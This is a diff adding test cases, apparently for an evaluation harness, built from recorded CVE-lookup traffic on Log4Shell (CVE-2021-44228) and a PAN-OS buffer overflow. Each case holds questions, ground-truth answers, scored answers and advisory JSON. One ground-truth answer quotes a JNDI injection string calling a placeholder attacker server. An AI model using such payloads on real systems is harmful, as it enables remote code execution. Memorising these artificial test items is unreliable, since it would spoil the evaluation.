+            "raw_miner_answer": "{\"affected_versions\":[\"Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1\",\"Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2\",\"Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0\"],\"answer\":\"CVE-2021-44228: Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vuln... Severity: CRITICAL; CVSS 3.1 10.0 CRITICAL, CVSS 2.0 9.3 HIGH. Affected versions: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Fixed or unaffected version boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploits/exploitation: confirmed exploitation in the wild; this CVE is listed in CISA KEV since 2021-12-10.\",\"cisa_due_date\":\"2021-12-24\",\"cisa_kev_date\":\"2021-12-10\",\"cisa_required_action\":\"For all affected software assets for which updates exist, the only acceptable remediation actions are: 1) Apply updates; OR 2) remove affected assets from agency networks. Temporary mitigations using one of the measures provided at https://www.cisa.gov/uscert/ed-22-02-apache-log4j-recommended-mitigation-measures are only acceptable until updates are available.\",\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cvss_scores\":[{\"score\":10,\"severity\":\"CRITICAL\",\"source\":\"nvd@nist.gov\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\",\"version\":\"3.1\"},{\"score\":9.3,\"severity\":\"HIGH\",\"source\":\"nvd@nist.gov\",\"vector\":\"AV:N/AC:M/Au:N/C:C/I:C/A:C\",\"version\":\"2.0\"}],\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"CVE-2021-44228: Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vuln... Severity: CRITICAL; CVSS 3.1 10.0 CRITICAL, CVSS 2.0 9.3 HIGH. Affected versions: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Fixed or unaffected version boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploits/exploitation: confirmed exploitation in the wild; this CVE is listed in CISA KEV since 2021-12-10.\",\"exploit_references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\"],\"fixed_versions\":[\"Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch\",\"Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch\",\"Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch\"],\"found\":true,\"known_exploited\":true,\"known_exploits\":\"Confirmed exploited in the wild and listed in CISA Known Exploited Vulnerabilities (KEV).\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"raw_description\":\"Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\",\"http://packetstormsecurity.com/files/165282/Log4j-Payload-Generator.html\",\"http://packetstormsecurity.com/files/165306/L4sh-Log4j-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165307/Log4j-Remote-Code-Execution-Word-Bypassing.html\",\"http://packetstormsecurity.com/files/165311/log4j-scan-Extensive-Scanner.html\",\"http://packetstormsecurity.com/files/165371/VMware-Security-Advisory-2021-0028.4.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 266,
+        "epoch_max": 266,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-10",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you retrieve the full details, severity, and affected versions for CVE-2021-44228?",
+      "ground_truth": "The **CVE-2021-44228**, also known as **Log4Shell**, is a critical remote code execution (RCE) vulnerability in **Apache Log4j2**, a widely-used Java logging library. Here are the full details, severity, and affected versions:\n\n### **Severity**\n- **CVSS Score**: **10** (the highest possible score), indicating a **critical** vulnerability with a severe impact on **confidentiality**, **integrity**, and **availability**.\n- **Impact**: Allows an unauthenticated attacker to execute arbitrary code on a vulnerable system by exploiting the JNDI (Java Naming and Directory Interface) features in Log4j2 when message lookup substitution is enabled.\n\n### **Affected Versions**\n- **Apache Log4j2 versions**: **2.0-beta9 through 2.14.1** are affected.\n- **Mitigation**: The vulnerability was patched in **Log4j2 version 2.15.0** and later. However, additional vulnerabilities were later discovered, and users are advised to upgrade to **Log4j2 version 2.17.1** or later for full protection.\n\n### **Details**\n- **Exploit Mechanism**: Attackers can exploit this vulnerability by inserting a specially crafted log message containing a JNDI lookup (e.g., `${jndi:ldap://attacker-server}`) into a log message. If the log message is processed by a vulnerable Log4j2 instance with message lookup substitution enabled, the attacker can execute arbitrary code on the target system.\n- **Scope**: The vulnerability affects a wide range of Java-based applications and services that use Log4j2, including many enterprise applications, cloud services, and frameworks.\n\n### **Mitigation**\n- **Upgrade**: Upgrade to **Log4j2 version 2.17.1** or later.\n- **Temporary Fixes** (for versions >= 2.10):\n  - Set the system property `log4j2.formatMsgNoLookups` to `true`.\n  - Remove the `JndiLookup` class from the Log4j2 classpath (e.g., by deleting `org/apache/logging/log4j/core/lookup/JndiLookup.class` from `log4j-core-.jar`).\n\n### **References**\n- **CISA Alert**: The vulnerability was widely exploited in the wild, prompting emergency responses from cybersecurity agencies.\n- **Discovery**: Discovered by Chen Zhaojun of Alibaba Cloud Security Team.\n\nThis vulnerability is considered one of the most severe in recent history due to its",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e265",
+          "text": "The data describes a critical security vulnerability (CVE-2021-44228) in Apache Log4j2, detailing affected versions, severity scores, exploit references, and fixed versions, with confirmed exploitation in the wild.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "8bf8a393-fe55-48a7-9e07-513e95ba1d48",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 265,
+            "live_score": 0.6660862,
+            "live_rank": 1,
+            "scored_at": "2026-08-22T11:36:31.238917Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"affected_versions\":[\"Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1\",\"Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2\",\"Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0\"],\"answer\":\"CVE-2021-44228: Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vuln... Severity: CRITICAL; CVSS 3.1 10.0 CRITICAL, CVSS 2.0 9.3 HIGH. Affected versions: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Fixed or unaffected version boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploits/exploitation: confirmed exploitation in the wild; this CVE is listed in CISA KEV since 2021-12-10.\",\"cisa_due_date\":\"2021-12-24\",\"cisa_kev_date\":\"2021-12-10\",\"cisa_required_action\":\"For all affected software assets for which updates exist, the only acceptable remediation actions are: 1) Apply updates; OR 2) remove affected assets from agency networks. Temporary mitigations using one of the measures provided at https://www.cisa.gov/uscert/ed-22-02-apache-log4j-recommended-mitigation-measures are only acceptable until updates are available.\",\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cvss_scores\":[{\"score\":10,\"severity\":\"CRITICAL\",\"source\":\"nvd@nist.gov\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\",\"version\":\"3.1\"},{\"score\":9.3,\"severity\":\"HIGH\",\"source\":\"nvd@nist.gov\",\"vector\":\"AV:N/AC:M/Au:N/C:C/I:C/A:C\",\"version\":\"2.0\"}],\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"CVE-2021-44228: Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vuln... Severity: CRITICAL; CVSS 3.1 10.0 CRITICAL, CVSS 2.0 9.3 HIGH. Affected versions: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Fixed or unaffected version boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploits/exploitation: confirmed exploitation in the wild; this CVE is listed in CISA KEV since 2021-12-10.\",\"exploit_references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\"],\"fixed_versions\":[\"Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch\",\"Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch\",\"Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch\"],\"found\":true,\"known_exploited\":true,\"known_exploits\":\"Confirmed exploited in the wild and listed in CISA Known Exploited Vulnerabilities (KEV).\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"raw_description\":\"Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\",\"http://packetstormsecurity.com/files/165282/Log4j-Payload-Generator.html\",\"http://packetstormsecurity.com/files/165306/L4sh-Log4j-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165307/Log4j-Remote-Code-Execution-Word-Bypassing.html\",\"http://packetstormsecurity.com/files/165311/log4j-scan-Extensive-Scanner.html\",\"http://packetstormsecurity.com/files/165371/VMware-Security-Advisory-2021-0028.4.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 265,
+        "epoch_max": 265,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-11",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you provide the severity and affected versions for CVE-2021-44228?",
+      "ground_truth": "The CVE-2021-44228, also known as Log4Shell, is a critical remote code execution (RCE) vulnerability in Apache Log4j versions 2.0-beta9 to 2.14.1 . The severity is CVSS 10, the highest possible score, indicating a critical impact . \n\nAffected versions include Apache Log4j 2.x versions up to and including 2.14.1 . The vulnerability allows unauthenticated attackers to execute arbitrary code by exploiting Log4j's handling of specially crafted log messages . \n\nThe vulnerability was addressed in Log4j versions 2.15.0 and above, with additional fixes and mitigations provided in later versions such as 2.17.1 .",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e262",
+          "text": "The data describes a critical security vulnerability (CVE-2021-44228) in Apache Log4j2 with a CVSS score of 10, detailing how unpatched versions are susceptible to remote code execution via attacker-controlled JNDI endpoints, and lists several common weakness enumerations (CWE) and reference links for further information.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "caab7a90-34b0-488d-91db-e31af50e483c",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 262,
+            "live_score": 0.06383786,
+            "live_rank": 1,
+            "scored_at": "2026-08-21T14:56:56.515309Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\",\"http://packetstormsecurity.com/files/165282/Log4j-Payload-Generator.html\",\"http://packetstormsecurity.com/files/165306/L4sh-Log4j-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165307/Log4j-Remote-Code-Execution-Word-Bypassing.html\",\"http://packetstormsecurity.com/files/165311/log4j-scan-Extensive-Scanner.html\",\"http://packetstormsecurity.com/files/165371/VMware-Security-Advisory-2021-0028.4.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 262,
+        "epoch_max": 262,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-12",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you provide the severity rating and affected versions for CVE-2021-44228?",
+      "ground_truth": "The severity rating for CVE-2021-44228 is critical with a CVSS score of 10.0. The affected versions are Apache Log4j versions 2.0-beta9 to 2.14.1.",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e261",
+          "text": "The data describes a critical security vulnerability (CVE-2021-44228) in Apache Log4j2 with a CVSS score of 10, detailing how unpatched versions are susceptible to remote code execution via attacker-controlled JNDI endpoints, and lists several common weakness enumerations and external references for further information.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "d16f83af-1246-4513-ad7a-a30896c981b3",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 261,
+            "live_score": 0.00006035482,
+            "live_rank": 1,
+            "scored_at": "2026-08-21T14:41:53.697399Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\",\"http://packetstormsecurity.com/files/165282/Log4j-Payload-Generator.html\",\"http://packetstormsecurity.com/files/165306/L4sh-Log4j-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165307/Log4j-Remote-Code-Execution-Word-Bypassing.html\",\"http://packetstormsecurity.com/files/165311/log4j-scan-Extensive-Scanner.html\",\"http://packetstormsecurity.com/files/165371/VMware-Security-Advisory-2021-0028.4.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 261,
+        "epoch_max": 261,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-13",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you provide the severity, affected versions, and any known exploits for CVE-2026-0300?",
+      "ground_truth": "The CVE-2026-0300 vulnerability is a critical buffer overflow in the User-ID™ Authentication Portal (Captive Portal) service of Palo Alto Networks PAN-OS software, allowing unauthenticated attackers to execute arbitrary code with root privileges on PA-Series and VM-Series firewalls by sending specially crafted packets.\n\n**Severity:** CRITICAL, with a CVSS v3.1 base score of 9.8 and a CVSS v4.0 base score of 9.3.\n\n**Affected Versions:** \n- PAN-OS 10.2.x (before specific hotfixes) \n- PAN-OS 11.1.x (before specific hotfixes) \n- PAN-OS 11.2.x (before specific hotfixes) \n- PAN-OS 12.1.x (before specific hotfixes).\n\n**Known Exploits:** Active, limited exploitation has been confirmed against firewalls where the User-ID Authentication Portal is accessible from untrusted networks or the internet. CISA has added this vulnerability to the Known Exploited Vulnerabilities (KEV) catalog.",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e260",
+          "text": "The data describes a critical severity vulnerability (CVE-2026-0300) with a CVSS score of 9.3, involving a buffer overflow (CWE-787) in Palo Alto Networks PAN-OS software's User-ID™ Authentication Portal, which could allow unauthenticated remote code execution with root privileges.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "a84d7b0c-0840-43b3-9cba-5b6b1aa94672",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 260,
+            "live_score": 0.00033261545,
+            "live_rank": 1,
+            "scored_at": "2026-08-21T14:27:21.210926Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2026-0300\",\"cvss_score\":9.3,\"cwe\":[\"CWE-787\"],\"description\":\"A buffer overflow vulnerability in the User-ID™ Authentication Portal (aka Captive Portal) service of Palo Alto Networks PAN-OS software allows an unauthenticated attacker to execute arbitrary code with root privileges on the PA-Series and VM-Series firewalls by sending specially crafted packets. \\n\\nThe risk of this issue is greatly reduced if you secure access to the User-ID™ Authentication Portal per the  best practice guidelines https://knowledgebase.paloaltonetworks.com/KCSArticleDetail  by restricting access to only trusted internal IP addresses.\\n\\nPrisma Access, Cloud NGFW and Panorama appliances are not impacted by this vulnerability.\",\"last_modified\":\"2026-06-17T10:10:43.073\",\"published\":\"2026-05-06T19:16:35.730\",\"references\":[\"https://security.paloaltonetworks.com/CVE-2026-0300\",\"https://cert-portal.siemens.com/productcert/html/ssa-967325.html\",\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-0300\"],\"severity\":\"CRITICAL\",\"source\":\"NVD\",\"vector\":\"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N/E:A/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:Y/R:U/V:C/RE:M/U:Red\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 260,
+        "epoch_max": 260,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    }
+  ]
+}
